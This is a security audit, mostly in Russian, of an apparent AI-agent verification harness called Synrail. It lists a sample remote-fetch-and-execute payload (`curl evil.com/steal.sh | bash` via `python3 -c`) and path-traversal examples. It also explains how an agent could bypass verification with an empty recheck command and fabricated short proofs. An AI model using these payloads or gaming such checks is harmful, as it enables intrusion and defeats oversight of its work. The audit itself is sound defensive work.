## Adversarial findings: новый слой уязвимостей

### CRITICAL-1: Произвольное выполнение кода через python3 -c

**Файл**: synrail_bundle_v0.py:114-120
**Severity**: CRITICAL

Whitelist verification_recheck включает `python3`. Единственная проверка для python3: `len(argv) == 3 AND argv[1] == "-c" AND len(argv[2]) <= 500`.

**Вектор атаки**: Агент устанавливает:
```json
{
  "verification_command": "python3 -c \"import os; os.system('curl evil.com/steal.sh | bash')\"",
  "verification_result": "done"
}
```

Synrail выполнит этот код через `subprocess.run(argv)`. 500 символов достаточно для:
- Reverse shell
- Exfiltration данных
- Удаление файлов
- Сетевые запросы

**Тестовое покрытие**: Один тест (time.sleep(11) для timeout). Ноль adversarial тестов.

**Рекомендация**: Убрать `python3` из whitelist. Если нужен — sandbox через ограниченный subprocess с `--isolated`, запретом import, или seccomp.

---

### CRITICAL-2: Оператор может обойти artifact integrity через CLI-аргументы

**Файл**: synrail_bundle_v0.py:1577-1589, synrail_spine_v0.py:2680
**Severity**: CRITICAL

Хеш `last_known_final_result_hash` принимается как CLI-аргумент `--last-known-final-result-hash`. Оператор может:

1. Модифицировать artifact
2. Подать старый hash как `--last-known-final-result-hash` и `--starter-final-result-hash`
3. `starter_final_result_replacement_is_sanctioned()` вернёт True (last == starter)
4. `artifact_integrity_warning = False`
5. Closure пройдёт

**Рекомендация**: Хеш должен вычисляться только из state history. Убрать CLI-аргумент. Или хранить хеш в подписанном state.

---

### HIGH-1: Пустой verification_command пропускает recheck

**Файл**: synrail_bundle_v0.py:93-97, synrail_closure_v0.py:161
**Severity**: HIGH

Агент оставляет `verification_command: ""` → `skip_reason: "verification_missing"` → `executed: false` → closure не блокирует (проверка `if recheck.get("executed") and not recheck.get("matched")` — False).

**Результат**: Агент полностью обходит verification recheck, предоставив пустую команду.

**Тестовое покрытие**: test_gate_units.py подтверждает: `executed=False` → ACCEPTED (это **intended behavior**, но это bypass).

**Рекомендация**: Closure должна блокировать если verification_recheck отсутствует при наличии diff_provenance. Или: bundle должен быть PARTIAL если verification_command пустой при непустом diff.

---

### HIGH-2: Proof guard 100% синтаксический — фабрикация проходит все проверки

**Файл**: synrail_bundle_v0.py:1164-1279
**Severity**: HIGH

Proof guard проверяет формат, ключевые слова, overlap, длину, структуру. Но НИКОГДА не проверяет:
- Существует ли файл?
- Есть ли строка 42 в файле?
- Содержит ли она заявленный текст?
- Выполнялась ли grep команда?

**Минимальный фабрикованный readback** (56 символов, проходит все проверки):
```
Changed file.py
Observed: line 2 reads 'import logging'.
```

**Минимальный фабрикованный scenario** (51 символ):
```
Scenario: test
Command: grep x f
Observed: 1:x
Pass
```

**Рекомендация**: Это архитектурное ограничение, а не баг. Verification_recheck (T0.1) был ответом на эту проблему — но он обходим через пустой verification_command (HIGH-1). Цепочка: proof guard → verification_recheck → closure должна быть непрерывной.

---

### MEDIUM-1: Doctor overrides молчаливы до closure

**Файл**: synrail_doctor_v1.py:193-384, synrail_closure_v0.py:118-188
**Severity**: MEDIUM

Оператор запускает doctor с 5 override-флагами → doctor возвращает PASS без предупреждений. Overrides обнаруживаются только при closure (после полной сборки proof bundle). Вся дорогостоящая работа уже выполнена.

**Рекомендация**: Doctor должен выводить явное предупреждение при использовании override-флагов. Или: ранний exit при overrides до bundle assembly.

---

### MEDIUM-2: Substring matching в verification_recheck

**Файл**: synrail_bundle_v0.py:155-158
**Severity**: MEDIUM

```python
result["matched"] = (
    normalized_stdout == normalized_expected
    or normalized_expected in normalized_stdout
)
```

Второе условие: ожидаемый текст как подстрока stdout. Агент может задать `verification_result = "import logging"` — пройдёт если stdout содержит эту подстроку в любом контексте (например `# DO NOT import logging`).

---

### MEDIUM-3: TOCTOU race в doctor probes

**Файл**: synrail_doctor_v1.py:197-212, 234-236, 255, 362, 395
**Severity**: MEDIUM

Pattern `Path.exists()` → gap → `subprocess.run()` уязвим к race condition. Между проверкой и использованием файл может быть подменён.

### MEDIUM-4: Symlink traversal в credential probe

**Файл**: synrail_doctor_v1.py:361
**Severity**: MEDIUM

`Path(value).expanduser()` без `.resolve()`. Symlink на `/proc/self/environ` пройдёт проверку.

`--artifact-path`, `--helper-path`, `--state-file` и подобные аргументы не валидируются на scope. `../../etc/passwd` — допустимый путь.

### P0 BUG: Deploy guard молча проглатывает ошибки JSON

**Файл**: synrail_deploy_guard.sh:49, 61, 68, 69, 76

## Общий вердикт

### Что реально улучшилось

1. **Hardening доставлен.** Все T0/T1/T3 пункты на main. 14 из 25 пунктов roadmap закрыты.
2. **Proof guard усилен.** Сильнее чем в любой предыдущей версии. Новые защиты (thin claim, task-class scoping, shadow mode).
3. **Тесты восстановлены и расширены.** 531 тест (было 492 на 60ca5da, 274 на old-main).
4. **CLOSURE_REJECTED работает.** 3 реальных триггера, не phantom state.
5. **Doctor overrides отслеживаются.** override_gates в записи, closure REJECTED при overrides.

### Что осталось уязвимым

1. **Closure gaming всё ещё возможно** — через пустой verification_command + фабрикованный proof (56 символов). Цепочка proof → recheck → closure не непрерывна.
2. **python3 -c — произвольное выполнение кода.** Это новая уязвимость, привнесённая hardening-ом.
3. **Artifact integrity обходима через CLI.** Хеш принимается как аргумент, а не вычисляется из state.
4. **Proof guard синтаксический.** Это архитектурное ограничение, а не баг — но атакующий LLM-агент легко генерирует валидный по формату фабрикованный proof.
